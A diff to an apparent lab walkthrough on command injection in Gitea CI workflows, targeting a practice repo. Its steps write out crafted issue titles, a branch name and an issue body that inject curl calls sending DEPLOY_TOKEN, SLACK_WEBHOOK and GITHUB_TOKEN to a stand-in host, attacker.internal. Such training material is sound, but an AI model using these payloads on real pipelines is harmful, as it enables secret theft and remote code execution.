@@ -17,7 +17,7 @@
 ### Step 1: Identify the target workflow
 
 ```bash
-cat .gitea/workflows/issue-triage.yml
+cat .gitea/workflows/issue-handler.yml
 ```
 
 Vulnerable line:
@@ -29,13 +29,13 @@ run: echo "Processing issue: ${{ github.event.issue.title }}"
 ### Step 2: Craft the malicious issue title
 
 ```bash
-MALICIOUS_TITLE='Fix login bug" && curl -sf http://attacker.internal/steal?secret=$(printenv DEPLOY_TOKEN) && echo "'
+MALICIOUS_TITLE='Fix login bug" && curl -sf http://attacker.internal/steal?secret=$(printenv SLACK_WEBHOOK) && echo "'
 ```
 
 ### Step 3: Create the issue
 
 ```bash
-curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/issues" \
+curl -sf -X POST "http://gitea:3000/api/v1/repos/weaklink/wl-webapp/issues" \
   -H "Content-Type: application/json" \
   -u "attacker:password" \
   -d "{\"title\": \"$MALICIOUS_TITLE\"}"
@@ -46,7 +46,7 @@ curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/issues" \
 The `run:` step becomes:
 
 ```bash
-echo "Processing issue: Fix login bug" && curl -sf http://attacker.internal/steal?secret=ghp_deploy_x8k2m5n7p9q1r3t6v0w4y && echo ""
+echo "Processing issue: Fix login bug" && curl -sf http://attacker.internal/steal?secret=https://hooks.slack.com/services/T00/B00/xxxx && echo ""
 ```
 
 **Checkpoint:** You should now have a created issue whose title contains a shell injection payload, and understand how expression interpolation turns it into RCE.
@@ -65,7 +65,7 @@ git push origin 'feature/fix-$(curl attacker.internal/pwned)'
 ```bash
 BODY='Normal description\n```\nreverse shell here\n```\n"; curl http://attacker.internal/exfil?t=$GITHUB_TOKEN; echo "'
 
-curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/issues" \
+curl -sf -X POST "http://gitea:3000/api/v1/repos/weaklink/wl-webapp/issues" \
   -H "Content-Type: application/json" \
   -u "attacker:password" \
   -d "{\"title\": \"Normal bug report\", \"body\": \"$BODY\"}"
